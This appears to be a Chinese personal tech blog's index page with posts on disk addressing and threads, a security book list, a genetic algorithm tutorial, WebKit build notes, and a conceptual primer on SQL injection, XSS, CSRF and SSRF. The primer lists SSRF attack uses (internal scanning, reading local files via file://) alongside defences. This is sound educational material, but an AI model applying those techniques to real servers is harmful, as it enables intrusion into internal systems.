<p>1）CHS模式（Cylinder/Head/Sector）  就是给定柱面号、磁头号、扇区号。柱面号给定在哪一个圆环上，磁头号指定了在哪一层，扇区号指定了圆上的位置，于是就定位到了一个准确的扇区了。  2）LBA（Logical Block Addressing，逻辑块寻址）  就是只给一个逻辑号码，根据硬盘的柱面数、每个柱面的磁头数、每个磁道的扇区数来计算柱面号、磁头号、扇区号。  编号方法：  按照柱面、磁头、扇区顺序来编，即编完0号柱面0号磁头所在磁道的若干扇区后，再编0号柱面1号磁头所在磁道的所以扇区，编完0号柱面的所有磁头后再编1号柱面。   </p>
<p>3）相互转换  LBA = （柱面号 <em> 一个柱面的磁头数 + 磁头号） </em> 一个磁道上的扇区数 + （扇区号-1）   柱面号 = LBA / （一个柱面的磁头数 <em> 每个磁道扇区数）  令   x = LBA % （一个柱面的磁头数 </em> 每个磁道扇区数）  磁头号 = x / 每个磁道上的扇区数  扇区号 = x % 每个磁道上的扇区数 + 1 </p>
<p><a href="https://blog.csdn.net/guzhou_diaoke/article/details/8479033" target="_blank" rel="noopener">https://blog.csdn.net/guzhou_diaoke/article/details/8479033</a></p>
<p>2018.10.2</p>
<p>内存使用效率：</p>
<p>分页：程序在一段时间段内都是不会被用到的，用更小粒度的内存分割和映射的方法，使得程序的局部性原理得到充分的利用，大大提高了内存的使用率，这种方法就是分页。</p>
<p>线程：（或称）轻量级进程，是程序执行流的最小单元，标准线程=线程ID+当前指令指针pc+寄存器集合+堆栈</p>
<p>通常一个进程=多个线程</p>
<p>​      线程的访问非常的自由，它可以访问进程内存里的所有数据，甚至包括其他进程的堆栈（如果他知道其他进程的堆栈地址，那么这种就是很少见的情况）但实际运用中线程也拥有自己的私有存储空间，包括以下几个方面：</p>
<ul>
<li>栈：（尽管并非完全无法被其他线程访问，一般情况下仍然可以认为是私有的数据）</li>
<li>线程局部存储（TLS）:是某些操作系统为线程单独提供的私有空间，但通常只是有限的容量</li>
<li>寄存器（包括pc寄存器）：寄存器是执行流的基本数据，因此为线程私有。</li>
</ul>
<p>IO密集型线程：频繁等待的线程；</p>
<p>CPU密集线程：很少等待的线程；</p>
<p>IO密集型线程总比CPU型密集型线程容易得到优先级的提升；</p>
<p>线程优先级改变一般有三种方式：</p>
<ul>
<li>用户指定优先级</li>
<li>根据进入等待状态的频繁程度提升或降低优先级</li>
<li>长时间得不到执行而被提升优先级</li>
</ul>
<p>写时复制：指的是两个任务可以同时自由的读取内存，但任意一个任务试图对内存进行修改时，内存就会复制一份提供给修改方单独使用，以免影响到其他的任务使用。</p>
<p>fork与exec通常用于产生新任务，而如果要产生新线程，则可以使用clone</p>
<p>原子操作：windows里有一套API,专门进行一些原子操作（interlocked API）</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/books/">books</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/09/26/定个任务书单吧/"><span>定个booklist任务吧</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/26/定个任务书单吧/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-26T15:52:59.000Z">
          2018-09-26
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="BookList："><a href="#BookList：" class="headerlink" title="BookList："></a>BookList：</h2><p>一号之前吧，给自己列一个书籍清单！监督自己赶年前（标*的）完成这些。。。。</p>
<p>二进制：</p>
<p>《深入理解Linux内核》*</p>
<p>《Linux内核设计与实现》*</p>
<p>《Linux内核源代码情景分析》*</p>
<p>《windows内核情景分析》*</p>
<p>《windows内核原理与实现》*</p>
<p>《寒江独钓:windows内核安全编程》*</p>
<p>《模糊测试-强制性安全漏洞发掘》*</p>
<p>技巧类</p>
<p>《黑客攻防技术宝典-系统实战篇》 人民邮电出版社</p>
<p>《reverse C++》</p>
<p>《c++反汇编与逆向分析技术揭秘》</p>
<p>《格蠢汇编：软件调试案例》</p>
<p>《黑客攻防技术宝典-系统实战篇》 人民邮电出版社</p>
<p>《0day安全：软件漏洞分析技术》 电子工业出版社</p>
<p>《漏洞战争-软件漏洞分析精要》 电子工业出版社</p>
<p>《逆向工程核心原理》人民邮电出版社</p>
<p>《加密与解密》</p>
<p>《IDA Pro权威指南》</p>
<p>《reverse engineering for beginners》</p>
<p>编程：</p>
<p>《Python灰帽子-黑客与逆向工程的python编程之道》*</p>
<p>《Python自动化运维：技术与最佳实践》</p>
<p>《精通黑客脚本》</p>
<p>《window核心编程》*</p>
<p>扩展：</p>
<p>《游戏外挂开放艺术》</p>
<p>《捉虫日记》</p>
<p>《黑客免杀》</p>
<p>《恶意代码分析》</p>
<p>《安全软件开发之道》</p>
<p>《模糊测试-强制性安全漏洞发掘》</p>
<p>《灰帽黑客：正义黑客的道德规范、渗透测试、攻击方法和漏洞分析技术》</p>
<p>出来混，迟早是要还的。。。</p>
<p>欠的书，迟早是要读的。。。</p>
<h4 id="附：BookList"><a href="#附：BookList" class="headerlink" title="附：BookList"></a>附：BookList</h4><p><a href="https://github.com/DerekLoveCC/BookList#%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">https://github.com/DerekLoveCC/BookList#%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8</a></p>
<h4 id="一系列编程算法书单"><a href="#一系列编程算法书单" class="headerlink" title="一系列编程算法书单"></a>一系列编程算法书单</h4><p><a href="https://github.com/HongYiMU/TheAlgorithm" target="_blank" rel="noopener">https://github.com/HongYiMU/TheAlgorithm</a></p>
<p><a href="https://github.com/knownsec/RD_Checklist/blob/master/special/index.rst" target="_blank" rel="noopener">https://github.com/knownsec/RD_Checklist/blob/master/special/index.rst</a></p>
<h4 id="一系列用于Fuzzing学习的资源汇总"><a href="#一系列用于Fuzzing学习的资源汇总" class="headerlink" title="一系列用于Fuzzing学习的资源汇总"></a>一系列用于Fuzzing学习的资源汇总</h4><p><a href="http://www.freebuf.com/articles/rookie/169413.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/rookie/169413.html</a></p>
<p><a href="https://github.com/secfigo/Awesome-Fuzzing" target="_blank" rel="noopener">https://github.com/secfigo/Awesome-Fuzzing</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/书籍/">书籍</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/09/23/关于遗传算法/"><span>关于遗传算法</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/23/关于遗传算法/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-23T10:42:56.000Z">
          2018-09-23
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p><strong>遗传算法</strong></p>
<p>因为在之前就有了解过该算法，并且该算法在好多工具都有体现，所以也刚好有个机会，去整理整理相关的资料，以后也会不断的去充实的！</p>
<p><strong>1.遗传算法定义</strong><br>       首先，我们先讲个例子。例如，在一群小狗里面挑选优秀的警犬种子。<br>    （1）设定好小狗的初始群大小；<br>    （2）定义一个函数来区分优秀犬类和普通犬类；<br>    （3）我们选择出优秀犬类，并让他们繁殖自己的后代；<br>    （4）最后，这些后代替代原来狗群中的普通类，不断地充实优秀犬类的占比，并且最后不断的重复该过程。</p>
<p>遗传算法的工作过程其实也是这样的，在某种程度上模拟进化的过程，所以我们可以由此得出该算法的定义；</p>
<p>遗传算法（Genetic Algorithm）是一类借鉴生物界的进化规律（适者生存，优胜劣汰遗传机制）演化而来的随机化搜索方法；</p>
<p><strong>2.遗传算法的实现细节</strong></p>
<p>总体的实现过程如图：</p>
<p><img src="/2018/09/23/关于遗传算法/main.PNG" alt="总体的流程图"></p>
<p>首先，算法随机生成一定数量的个体，有时候操作者也可以干预这个随机产生过程，以提高初始种群的质量。在每一代中，都会评价每一个体，并通过计算适应度函数得到适应度数值。按照适应度排序种群个体，适应度高的在前面。这里的“高”是相对于初始的种群的低适应度而言。 </p>
<p>下一步则是产生下一代个体并且组成种群，而这个过程则是通过选择和繁殖来完成的，即Crossover交叉操作和Mutation变异。然后再进行根据新个体的适应度进行，但同时不意味着完全以适应度高低为导向，因为单纯选择适应度高的个体将可能导致算法快速收敛到局部最优解而非全局最优解，我们称之为早熟。作为折中，遗传算法依据原则：适应度越高，被选择的机会越高，而适应度低的，被选择的机会就低。初始的数据可以通过这样的选择过程来不断进行来组成一个相对优化的群体。 </p>
<p>在该过程中具体的实现细节，我们以背包问题为例：比如，你准备要去野游 1 个月，但是你只能背一个限重 30 公斤的背包。现在你有不同的必需物品，它们每一个都有自己的「生存点数」（具体在下表中已给出）。因此，你的目标是在有限的背包重量下，最大化你的「生存点数」。 </p>
<p><img src="/2018/09/23/关于遗传算法/bagg.jpg" alt="背包问题"></p>
<p>2.1初始化</p>
<p>如上流程所述，我们首先来初始化定义总体，总体包含各个个体，而每个个体都有一套属于自己的染色体。</p>
<p>染色体可表达为 2 进制数串，在这个问题中，1 代表接下来位置的基因存在，0 意味着丢失。（特定位置上的基因代表了上方背包问题表格中的物品，比如第一个位置上是 Sleeping Bag，那么此时反映在染色体的『基因』位置就是该染色体的第一个『基因』。） </p>
<p><img src="/2018/09/23/关于遗传算法/gene.jpg" alt=""></p>
<p>如上图，我们将图中的 4 条染色体看作我们的总体初始值。</p>
<p>2.2适应度函数</p>
<p>接下来，我们计算前两条染色体的适应度分数。对于 A1 染色体 [100110] 而言， 则有</p>
<p><img src="/2018/09/23/关于遗传算法/2.2.jpg" alt=""></p>
<p>类似的，则对于A2 染色体 [001110] 来说 ：</p>
<p><img src="/2018/09/23/关于遗传算法/2.3.jpg" alt=""></p>
<p>一次类推，当染色体包含更多生存分数时，也就意味着它的适应性更强。因此，由图可知，染色体 1 适应性强于染色体 2。</p>
<p>2.3选择</p>
<p>现在接下来我们依照步骤二从总体中选择适合的染色体进行交叉操作，并且产生自己的下一代，但是这样将会导致染色体在几代之后相互差异减小，失去了多样性。故而，这部分会有多种选择算法，常见的选择操作主要有以下几种 : </p>
<p>​       a)轮盘赌选择 。选择某假设的概率是通过这个假设的适应度与当前群体中其他成员的适应度的比值而得到。此方法是基于概率选择的,存在统计误差,因此可以结合最优保存策略以保证当前适应度最优的个体能够进化到下一代而不被遗传操作的随机性破坏,保证算法的收敛性。       </p>
<p>​       b)排序选择。对个体适应值取正值或负值以及个体适应度之间的数值差异程度无特殊要求 , 对群体中的所有个体按其适应度大小进行排序,根据排序来分配各个体被选中的概率。        </p>
<p>​       c)最优个体保存。父代群体中的最优个体直接进入子代群体中。该方法可保证在遗传过程中所得到的个体不会被交叉和变异操作所破坏,它是遗传算法收敛性的一个重要保证条件 ；它也容易使得局部最优个体不易被淘汰,从而使算法的全局搜索能力变强。        </p>
<p>​       d)随机联赛选择。每次选取N个个体中适应度最高的个体遗传到下一代 群体中。具体操作如下: 从群体中随机选取N个个体进行适应度大小比较,将其中适应度最高的个体遗传到下一代群体中；将上述过程重复执行M(为群体大小)次,则可得到下一代群体。 </p>
<p>而我们一般会进行轮盘赌选择法， 想象有一个轮盘，现在我们将它分割成 m 个部分，这里的 m 代表我们总体中染色体的个数。每条染色体在轮盘上占有的区域面积将根据适应度分数成比例表达出来。</p>
<p>如图：Chromosome1的百分比：28/（28+23+12+34）=28.9% </p>
<p><img src="/2018/09/23/关于遗传算法/2.4.jpg" alt=""></p>
<p>我们基于上面的百分比来建立轮盘，如下图所示：</p>
<p><img src="/2018/09/23/关于遗传算法/2.5.jpg" alt=""></p>
<p>现在，这个轮盘开始旋转，我们将被图中固定的指针（fixed point）指到的那片区域选为第一个亲本。然后，对于第二个亲本，我们进行同样的操作。有时候我们也会在途中标注两个固定指针，如下图： </p>
<p><img src="/2018/09/23/关于遗传算法/2.6.jpg" alt=""></p>
<p>通过这种方法，我们可以在一轮中就获得两个亲本。我们将这种方法成为「随机普遍选择法」（Stochastic Universal Selection method）。 </p>
<p>2.4交叉</p>
<p>在上一个步骤中，我们已经选择出了可以产生后代的亲本染色体。现在我们来对染色体 1 和 4（在上一个步骤中选出来的）进行交叉操作 ，而此处的常用交叉算法有如下几种：</p>
<p>  a)单点交叉。  在个体编码串中随机设置一个交叉点后在该点相互交换两个配对个体的部分基因 。        </p>
<p>  b)两点交叉。  在相互配对的两个个体编码串中随机设置两个交叉点,并交换两个交叉点之间的部分基因 。        </p>
<p>  c)均匀交叉。  两个相互配对个体的每一位基因都以相同的概率进行交换,从而形成两个新个体。       </p>
<p>  d)算术交叉。  由两个个体的线性组合而产生出新的个体。 </p>
<p>此处我们来演示单点交叉于多点交叉：</p>
<p><img src="/2018/09/23/关于遗传算法/3.1.jpg" alt=""></p>
<p>这是交叉最基本的形式，我们称其为「单点交叉」。这里我们随机选择一个交叉点，然后，将交叉点前后的染色体部分进行染色体间的交叉对调，于是就产生了新的后代。 </p>
<p>如果你设置两个交叉点，那么这种方法被成为「多点交叉」，见下图： </p>
<p><img src="/2018/09/23/关于遗传算法/3.2.jpg" alt=""></p>
<p>2.5变异</p>
<p>如果现在我们从生物学的角度来看这个问题，那么请问：由上述过程产生的后代是否有和其父母一样的性状呢？答案是否。在后代的生长过程中，它们体内的基因会发生一些变化，使得它们与父母不同。这个过程我们称为变异，它可以被定义为染色体上发生的随机变化，正是因为变异，种群中才会存在多样性。 </p>
<p>下图为变异的一个简单示例： </p>
<p><img src="/2018/09/23/关于遗传算法/3.3.jpg" alt=""></p>
<p>变异完成之后，我们就得到了新为个体，进化也就完成了，整个过程如下图：</p>
<p><img src="/2018/09/23/关于遗传算法/3.4.jpg" alt=""></p>
<p>​在进行完一轮遗传变异之后，我们用适应度函数对这些新的后代进行验证，如果函数判定它们适应度足够，那么就会用它们从总体中替代掉那些适应度不够的染色体。这里有个问题，我们最终应该以什么标准来判断后代达到了最佳适应度水平呢？</p>
<p>一般来说，有如下几个终止条件：</p>
<ol>
<li>进化次数限制；</li>
<li>计算耗费的资源限制（例如计算时间、计算占用的内存等）；</li>
<li>一个个体已经满足最优值的条件，即最优值已经找到；</li>
<li>适应度已经达到饱和，继续进化不会产生适应度更好的个体；</li>
<li>人为干预；</li>
<li>以及以上两种或更多种的组合。</li>
</ol>
<p><strong>参考文献</strong></p>
<p>【1】<a href="https://zhuanlan.zhihu.com/p/28328304" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28328304</a>【例子】</p>
<p>【2】<a href="https://zh.wikipedia.org/wiki/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/算法/">算法</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/09/03/webkit/"><span>webkit</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/03/webkit/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-03T15:14:31.000Z">
          2018-09-03
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>​       时隔好久之后的博客，一直准备要写来着，可惜时间问题，所以就一直拖着！</p>
<p>​       今天是猪猪的第一天加班，要陪他下班。。。（所以就来先写个前导吧)</p>
<p>​       本来要在上周末打算写这篇的，猪猪给我了我个大惊喜，周末过得好充实。再加上今天终于解决了上周的遗留问题，应该是猪猪来了的原因吧，所以这么快就解决了这个问题！最近在项目中接触到了<code>WebKit</code>的相关问题！谈到<code>WebKit</code>，那就来谈谈最新版的<code>WebKit</code>的编译问题吧！</p>
<p><strong>一，webkit编译</strong></p>
<p>​        源码下载的方式：</p>
<ol>
<li><p>进入<a href="https://webkit.org/getting-the-code/" target="_blank" rel="noopener">https://webkit.org/getting-the-code/</a> 进行源码包 的下载，该源码每天都会进行更新；然后对包进行解压</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar jxvf WebKit-SVN-source.tar.bz2</span><br><span class="line">cd webkit</span><br></pre></td></tr></table></figure>
</li>
<li><p>SVN进行下载：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svn checkout https://svn.webkit.org/repository/webkit/trunk WebKit</span><br><span class="line">并且可运行update-webkit脚本更新源码</span><br></pre></td></tr></table></figure>
</li>
<li><p>Git下载：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git://git.webkit.org/WebKit.git WebKit</span><br></pre></td></tr></table></figure>
<p>  对源码进行编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">在编译过程中因为系统版本的问题，踩过的坑可真不少！所以在这里记录一下：</span><br><span class="line">1.依赖库安装</span><br><span class="line">编译过程中，我们首先需要进行WebKit提供的脚本依赖库安装：</span><br><span class="line"></span><br><span class="line">./WebKit/Tools/gtk/install-dependencies </span><br><span class="line">./WebKit/Tools/Script/update-webkitgtk-libs //执行第二个命令要注意不能在root账号下 第二个命令实际上是下载jhbuild编译工具编译gnome环境，在执行第二条命令时，这个耗时特别长,会出现网络问题，导致如下下载出错</span><br><span class="line">git clone https://github.com/jhbuild.git </span><br><span class="line">clone 'jhbuild'...</span><br><span class="line">remote: Counting objects: 3658, done.</span><br><span class="line">error: RPC failed; curl 56 GnuTLS recv error (-54): Error in the pull function.</span><br><span class="line">fatal: The remote end hung up unexpectedly</span><br><span class="line">fatal: （EOF）</span><br><span class="line">fatal: index-pack failed</span><br><span class="line">Failed to build GTK+ port dependencies with jhbuild</span><br><span class="line">Died at ./WebKit/Tools/Scripts/update-webkitgtk-libs line 24.</span><br><span class="line">解决方法：</span><br><span class="line">应该是clone内容更新太多，需要设置postBuffer更大些，用下面命令解决</span><br><span class="line">git config --global http.postBuffer 524288000</span><br><span class="line">大多是因为网速的问题，所以这部分可尽量选择在网速较好的时段内去选择下载，中间出现差错，可多次尝试。</span><br><span class="line"></span><br><span class="line">2.编译</span><br><span class="line">在以上安装包安装完毕后，可进行编译</span><br><span class="line">如果是svn得到的代码，进入webkit目录后执行编译脚本得到./WebKitBuild/Release/bin/jsc</span><br><span class="line"><span class="meta">$</span> cd webkit</span><br><span class="line"><span class="meta">$</span> ./Tools/Scripts/build-jsc --gtk --makeargs="-j4"</span><br><span class="line">由于webkit是最新版的，而且编译的时候参考了官网的教程，所以在编译的过程中，相对速度较快，问题较少，中间缺少一个依赖包，安装即可；</span><br><span class="line">-- Checking for module 'libwoff2dec'</span><br><span class="line">--   No package 'libwoff2dec' found</span><br><span class="line">-- Could NOT find WOFF2Dec: Found unsuitable version "", but required is at least "1.0.2" (found WOFF2DEC_INCLUDE_DIRS-NOTFOUND)</span><br><span class="line">CMake Error at Source/cmake/OptionsGTK.cmake:351 (message):</span><br><span class="line">  libwoff2dec is needed for USE_WOFF2.</span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  Source/cmake/WebKitCommon.cmake:61 (include)</span><br><span class="line">  CMakeLists.txt:156 (include)</span><br><span class="line">解决方法：根据提示的No package 'libwoff2dec' found 如果直接下载package 'libwoff2dec'会报错，对相关依赖包进行查看后该处缺少的是libwoff-dev 直接sudo apt下载即可</span><br><span class="line">sudo apt-get install libwoff-dev</span><br><span class="line">安装完毕，继续进行编译则可。</span><br><span class="line">最终会出现想要的这个</span><br><span class="line">[1336/1336] Linking CXX executable bin/testb3</span><br><span class="line">====================================================================</span><br><span class="line"> JavaScriptCore is now built (36m:38s). </span><br><span class="line">====================================================================</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>二，编译环境</strong></p>
<p>​       编译主机版本：<code>Ubuntu 18.04</code>  </p>
<p>​       <code>WebKit</code>版本：<code>WebKit r235496</code></p>
<p><strong>三，参考文献</strong></p>
<p>​     【1】<a href="https://webkit.org/building-webkit/" target="_blank" rel="noopener">https://webkit.org/building-webkit/</a></p>
<p>​     【2】<a href="https://trac.webkit.org/wiki/BuildingGtk" target="_blank" rel="noopener">https://trac.webkit.org/wiki/BuildingGtk</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/浏览器安全/">浏览器安全</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/04/25/一些漏洞整理/"><span>一些漏洞整理</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/04/25/一些漏洞整理/" rel="bookmark">
        <time class="entry-date published" datetime="2018-04-25T11:41:41.000Z">
          2018-04-25
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <hr>
<p>一些漏洞的基础原理+安全基础知识整理（之前就想发来着，但是一直完完善善到现在）</p>
<p>sql注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SQL注入:是一种通过操纵输入来修改后台sql语句已达到利用代码进行攻击的技术。</span><br><span class="line">为什么会产生SQL注入：程序在开发过程中不注意规范书写sql语句和对字符进行过滤，导致可以通过全局变量post/get提交一些sql语句。</span><br><span class="line">如何防御：a:限制用户的操作权限；b:检查限制变量类型； c：对特殊字符进行过滤/转义 d:使用参数化语句(sqlParameter类库中的规则，绝对不会让用户的输入拼接成sql语句改变其原来意义)</span><br><span class="line">基于程度和顺序的注入(哪里发生了影响)</span><br><span class="line">- 一阶注射</span><br><span class="line">- 二阶注射</span><br><span class="line">一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.</span><br><span class="line">基于注入点的位置上的 </span><br><span class="line">- - 通过用户输入的表单域的注射。</span><br><span class="line">  - 通过cookie注射。</span><br><span class="line">  - 通过服务器变量注射。 （基于头部信息的注射）</span><br></pre></td></tr></table></figure>
<p>xss攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xss:当应用程序收到含有不可信的数据时，在没有进行验证与转义的情况下，就将它发送给一个网页浏览器，这样就会产生跨站脚本攻击。</span><br><span class="line">为什么会有xss:网页中被嵌入了javascript代码，当用户点击网页时script代码就会被执行，进而进行脚本攻击。</span><br><span class="line">防御：a:验证数据类型；(htmlSpecialChars()防止解析浏览器html元素)</span><br><span class="line">                    (addslashes()双引号前加反斜杠)</span><br><span class="line">     b:输入输出安全检查</span><br><span class="line">分类: 存储型(发到站上)</span><br><span class="line">      反射型(构造一些url)</span><br><span class="line">      DOM型</span><br></pre></td></tr></table></figure>
<p>csrf攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">csrf:csrf说白了就是盗用用户的身份.</span><br><span class="line"> 防御：A:验证 HTTP Referer 字段；</span><br><span class="line">        在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。</span><br><span class="line">        这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。</span><br><span class="line">        即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。</span><br><span class="line">        </span><br><span class="line">      B:在请求地址中添加 token 并验证；</span><br><span class="line">        CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</span><br><span class="line"></span><br><span class="line">        这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对.</span><br><span class="line">        该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。</span><br><span class="line"></span><br><span class="line">      C:在 HTTP 头中自定义属性并验证;</span><br><span class="line">        这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</span><br><span class="line"></span><br><span class="line">       然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</span><br></pre></td></tr></table></figure>
<p>ssrf攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssrf:如果应用程序对用户提供的url和远端服务器返回的信息没有进行合适验证和过滤，就可能存在这种服务器端请求伪造的缺陷。</span><br><span class="line">攻击：   a.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</span><br><span class="line">        b.攻击运行在内网或本地的应用程序（比如溢出）;</span><br><span class="line">        c.对内网web应用进行指纹识别，通过访问默认文件实现;</span><br><span class="line">        d.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</span><br><span class="line">        e.利用file协议读取本地文件等。</span><br><span class="line">防御：   a:过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</span><br><span class="line">         b: 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br><span class="line">         c:限制请求的端口为http常用的端口，比如，80,443,8080,8090。</span><br><span class="line">         d:黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</span><br><span class="line">         e:禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</span><br></pre></td></tr></table></figure>
<p>文件上传漏洞</p>
